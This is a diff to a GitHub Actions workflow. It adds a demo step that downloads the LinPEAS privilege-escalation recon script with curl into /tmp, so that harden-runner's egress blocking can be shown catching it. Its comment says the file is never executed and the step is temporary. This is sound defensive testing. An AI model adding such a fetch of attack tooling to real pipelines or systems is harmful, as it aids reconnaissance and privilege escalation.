@@ -41,6 +41,19 @@ jobs:
       - name: Build binary
         run: go build -o opentelemetry-lazybackend .
 
+      # DEMO: simulates a common CI/CD attack TTP — a compromised step pulling a
+      # reconnaissance/enumeration script (LinPEAS) from raw.githubusercontent.com,
+      # a host intentionally NOT in the allowed-endpoints list above (we only allow
+      # objects./release-assets.githubusercontent.com). With egress-policy: block,
+      # harden-runner blocks the connection and records the attempt in the run's
+      # security insights. The payload is only downloaded to a file (never piped to
+      # a shell) so nothing executes even if the policy were disabled. Remove after the demo.
+      - name: Demo blocked recon-tool download
+        run: |
+          curl --fail --max-time 10 -sSL \
+            https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh \
+            -o /tmp/recon.sh
+
   integration:
     needs: verify
     runs-on: ubuntu-22.04
